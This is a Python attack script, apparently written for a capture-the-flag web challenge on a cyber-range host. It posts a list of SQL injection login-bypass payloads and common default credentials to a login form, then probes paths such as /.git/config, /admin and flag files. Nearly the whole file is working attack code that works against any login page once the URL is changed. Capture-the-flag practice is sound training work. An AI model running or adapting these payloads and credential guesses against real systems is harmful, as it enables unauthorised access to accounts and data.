#!/usr/bin/env python3
"""
Advanced Web Exploit - Direct HTTP requests to bypass client-side filtering
"""

import requests
import json

def test_direct_post():
    """Send POST request directly, bypassing client-side JavaScript"""
    
    url = "https://sanitize.challenges.virginiacyberrange.net/login"
    
    # Common SQL injection payloads
    sqli_payloads = [
        "admin' OR '1'='1'--",
        "admin'--",
        "' OR 1=1--",
        "admin' OR 'a'='a'--",
        "admin') OR ('1'='1'--",
        "admin' UNION SELECT 1,2,3--",
        "' OR '1'='1' /*",
        "admin' OR 1=1#",
        "') OR ('1'='1",
        "admin'/**/OR/**/1=1--"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    print("[*] Testing direct POST requests with SQL injection payloads...")
    
    for payload in sqli_payloads:
        data = {
            'username': payload,
            'password': 'password'
        }
        
        print(f"\n[*] Testing payload: {payload}")
        
        try:
            response = requests.post(url, data=data, headers=headers, timeout=10)
            print(f"[*] Status: {response.status_code}")
            
            # Check for success indicators
            content = response.text.lower()
            if any(word in content for word in ['flag', 'ctf{', 'congratulations', 'success', 'welcome']):
                print(f"[+] POTENTIAL SUCCESS! Payload: {payload}")
                print(f"[+] Response content:\n{response.text}")
                
                # Save successful response
                with open('/workspaces/SkillsUSA-Nats-2025/website/successful_response.html', 'w') as f:
                    f.write(response.text)
                    
                return True
                
            elif 'error' in content or 'invalid' in content or 'failed' in content:
                print(f"[-] Login failed: {content[:100]}...")
            else:
                print(f"[?] Unexpected response: {content[:100]}...")
                
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")
    
    # Try some default credentials too
    print("\n[*] Testing common default credentials...")
    default_creds = [
        ('admin', 'admin'),
        ('administrator', 'password'),
        ('admin', 'password'),
        ('admin', ''),
        ('guest', 'guest'),
        ('root', 'root'),
        ('admin', '123456'),
        ('test', 'test'),
        ('user', 'user')
    ]
    
    for username, password in default_creds:
        data = {
            'username': username,
            'password': password
        }
        
        print(f"[*] Testing {username}:{password}")
        
        try:
            response = requests.post(url, data=data, headers=headers, timeout=10)
            content = response.text.lower()
            
            if any(word in content for word in ['flag', 'ctf{', 'congratulations', 'success', 'welcome']):
                print(f"[+] SUCCESS! Credentials: {username}:{password}")
                print(f"[+] Response:\n{response.text}")
                
                with open('/workspaces/SkillsUSA-Nats-2025/website/successful_login.html', 'w') as f:
                    f.write(response.text)
                    
                return True
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

def check_other_endpoints():
    """Check for other interesting endpoints"""
    base_url = "https://sanitize.challenges.virginiacyberrange.net"
    
    endpoints = [
        "/",
        "/admin",
        "/dashboard",
        "/flag",
        "/robots.txt",
        "/sitemap.xml",
        "/.git/config",
        "/config.php",
        "/admin.php",
        "/login.php",
        "/index.php",
        "/flag.txt",
        "/admin/flag.txt"
    ]
    
    print("\n[*] Checking for other endpoints...")
    
    for endpoint in endpoints:
        url = base_url + endpoint
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"[+] Found: {url} (Status: {response.status_code})")
                content = response.text.lower()
                if 'flag' in content or 'ctf{' in content:
                    print(f"[+] POTENTIAL FLAG FOUND at {url}")
                    print(response.text[:500])
            elif response.status_code in [301, 302]:
                print(f"[*] Redirect: {url} -> {response.headers.get('Location', 'Unknown')}")
        except:
            pass

if __name__ == "__main__":
    print("[*] Starting advanced web exploitation...")
    
    # Check for other endpoints first
    check_other_endpoints()
    
    # Then try the direct POST attack
    success = test_direct_post()
    
    if not success:
        print("\n[-] No obvious vulnerabilities found with these methods.")
        print("[*] Consider manual testing with tools like Burp Suite or browser dev tools.")
